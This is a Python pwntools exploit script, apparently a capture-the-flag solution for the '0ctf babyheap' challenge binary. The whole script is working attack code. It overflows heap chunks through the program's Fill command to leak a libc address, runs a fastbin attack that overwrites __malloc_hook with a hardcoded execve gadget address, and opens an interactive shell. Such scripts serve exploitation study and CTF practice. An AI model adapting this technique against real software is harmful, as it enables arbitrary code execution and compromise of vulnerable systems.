from pwn import *

p = process('./0ctfbabyheap')
#p = remote('127.0.0.1', 4000)
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

#context.log_level = 'debug'

def Allocate(size):
	p.recvuntil('Command: ')
	p.sendline('1')
	p.recvuntil('Size: ')
	p.sendline(str(size))
	
def Fill(index, content):
	p.recvuntil('Command: ')
	p.sendline('2')
	p.recvuntil('Index: ')
	p.sendline(str(index))
	p.recvuntil('Size: ')
	p.sendline(str(len(content) + 1))
	p.recvuntil('Content: ')
	p.sendline(content)

def Free(index):
	p.recvuntil('Command: ')
	p.sendline('3')
	p.recvuntil('Index: ')
	p.sendline(str(index))

def Dump(index):
	p.recvuntil('Command: ')
	p.sendline('4')
	p.recvuntil('Index: ')
	p.sendline(str(index))
	p.recvuntil('Content: \n')
	data = p.recvline()
	return data

def leak_libc():	
	Allocate(0x60)
	Allocate(0x40)

	#gdb.attach(p)

	payload = 'a'*0x60 + p64(0) + p64(0x71)
	Fill(0, payload)

	Allocate(0x100)
	Allocate(0x60)
	payload = 'a'*0x10 + p64(0) + p64(0x71)
	Fill(2, payload)

	Free(1)
#	gdb.attach(p)
	Allocate(0x60)
	payload = 'a'*0x40 + p64(0) + p64(0x111)
	Fill(1, payload)
	
	#gdb.attach(p)

	Free(2)
	leaked = u64(Dump(1)[-9:-1])
	print "libc_base : %#x" % (leaked - 0x3C27B8)
	return leaked - 0x3C27B8

def fastbin_attack(libc_base):
	malloc_hook = libc_base + 0x3C2740
	execve_addr = libc_base + 0x4647c
	
	print "malloc_hook : %#x" % malloc_hook 
	print "execve_addr : %#x" % execve_addr

	Allocate(0x60)		
	Allocate(0x60)	
	Free(4)	

	payload = 'a'*0x60 + p64(0) + p64(0x71) + p64(malloc_hook - 27 - 8) + p64(0) 
	Fill(2, payload)	
	
#	gdb.attach(p)

	Allocate(0x60)
	Allocate(0x60)
	sleep(1)	
	payload = p8(0)*3 + p64(0)*2  + p64(execve_addr)
	Fill(5, payload)
	gdb.attach(p)

	Allocate(0x20)

libc_base = leak_libc()
fastbin_attack(libc_base)

p.interactive()




	
